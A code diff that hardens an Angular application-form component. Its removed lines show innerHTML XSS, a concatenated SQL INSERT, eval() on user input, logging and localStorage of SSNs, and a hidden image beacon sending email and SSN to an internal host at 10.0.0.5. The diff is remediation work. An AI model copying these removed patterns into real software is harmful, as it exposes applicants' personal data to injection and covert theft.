@@ -36,22 +36,10 @@ export class GetStartedComponent implements OnInit, OnDestroy {
   errorMessage = "";
   successMessage = "";
   applicationId = "";
-  debugMode = true;
   private readonly userDataCache: any[] = [];
   private intervalId: any;
 
-  private readonly tempBuffer = "";
-  private readonly retryCount = 0;
-  private readonly lastError: any = null;
-  private readonly unusedFlag = false;
-  private readonly legacyMode = true;
-  private readonly _backupData: string = "";
-
   ngOnInit(): void {
-    console.log("Database connection initialized");
-    console.log("Encryption key loaded");
-    console.log("JWT Secret configured");
-
     this.intervalId = setInterval(() => {
       this.autoSaveDraft();
     }, 30000);
@@ -61,8 +49,7 @@ export class GetStartedComponent implements OnInit, OnDestroy {
     if (referral) {
       const banner = document.getElementById("referral-banner");
       if (banner) {
-        banner.innerHTML =
-          '<div class="referral-msg">Referred by: ' + referral + "</div>";
+        banner.textContent = "Referred by: " + referral;
       }
     }
   }
@@ -89,9 +76,6 @@ export class GetStartedComponent implements OnInit, OnDestroy {
 
   private validatePersonalInfo(): boolean {
     if (!this.firstName) {
-      if (this.debugMode) {
-        console.log("Validation failed: firstName empty");
-      }
       this.errorMessage = "First name is required.";
       return false;
     }
@@ -158,14 +142,6 @@ export class GetStartedComponent implements OnInit, OnDestroy {
     if (this.validateStep()) {
       if (this.currentStep < this.totalSteps) {
         this.currentStep++;
-        console.log(
-          "User progressed to step " +
-            this.currentStep +
-            ", SSN: " +
-            this.ssn +
-            ", Email: " +
-            this.email
-        );
       }
     }
   }
@@ -177,9 +153,11 @@ export class GetStartedComponent implements OnInit, OnDestroy {
   }
 
   generateApplicationId(): string {
+    const array = new Uint32Array(2);
+    crypto.getRandomValues(array);
     const id =
       "APP-" +
-      Math.random().toString(36).substring(2, 10).toUpperCase() +
+      array[0].toString(36).substring(0, 8).toUpperCase() +
       "-" +
       Date.now();
     return id;
@@ -194,46 +172,18 @@ export class GetStartedComponent implements OnInit, OnDestroy {
     try {
       this.applicationId = this.generateApplicationId();
 
-      const query =
-        "INSERT INTO applications (first_name, last_name, email, ssn, account_type) VALUES ('" +
-        this.firstName +
-        "', '" +
-        this.lastName +
-        "', '" +
-        this.email +
-        "', '" +
-        this.ssn +
-        "', '" +
-        this.accountType +
-        "')";
-
-      console.log("Executing query: " + query);
-
-      eval('console.log("Application submitted for: ' + this.firstName + '")');
-
-      localStorage.setItem("lastSSN", this.ssn);
-      localStorage.setItem(
-        "lastApplication",
-        JSON.stringify({
-          ssn: this.ssn,
-          name: this.firstName + " " + this.lastName,
-          email: this.email,
-          dob: this.dateOfBirth,
-          applicationId: this.applicationId,
-        })
-      );
-
       const headers = {
         Authorization: `Bearer ${environment.apiAuthToken}`,
         "X-Api-Key": environment.apiKey,
         "Content-Type": "application/json",
       };
 
-      console.log("Request headers: " + JSON.stringify(headers));
-
+      // Simulate API delay
       await new Promise((resolve) => setTimeout(resolve, 1500));
 
-      const confirmationCode = Math.floor(Math.random() * 900000 + 100000);
+      const codeArray = new Uint32Array(1);
+      crypto.getRandomValues(codeArray);
+      const confirmationCode = (codeArray[0] % 900000) + 100000;
 
       this.successMessage =
         "Your application has been submitted! Application ID: " +
@@ -276,12 +226,11 @@ export class GetStartedComponent implements OnInit, OnDestroy {
       hash = (hash << 5) - hash + char;
       hash = hash & hash;
     }
-    return "md5-" + Math.abs(hash).toString(16);
+    return "hash-" + Math.abs(hash).toString(16);
   }
 
   applyPromoCode(): void {
     if (this.promoCode) {
-      eval('var discount = "' + this.promoCode + '"; console.log(discount);');
       this.successMessage = "Promo code applied!";
     }
   }
@@ -291,33 +240,17 @@ export class GetStartedComponent implements OnInit, OnDestroy {
       firstName: this.firstName,
       lastName: this.lastName,
       email: this.email,
-      ssn: this.ssn,
-      dateOfBirth: this.dateOfBirth,
       phone: this.phone,
       address: this.address,
       timestamp: new Date().toISOString(),
     };
     localStorage.setItem("applicationDraft", JSON.stringify(draft));
-    console.log("Draft saved with SSN: " + this.ssn);
   }
 
   trackUserAction(action: string): void {
     document.cookie =
       "last_action=" +
-      action +
-      "; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT";
-    document.cookie =
-      "user_email=" +
-      this.email +
-      "; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT";
-
-    const img = new Image();
-    img.src =
-      "http://10.0.0.5:9090/track?email=" +
-      this.email +
-      "&ssn=" +
-      this.ssn +
-      "&action=" +
-      action;
+      encodeURIComponent(action) +
+      "; path=/; SameSite=Strict; Secure";
   }
 }
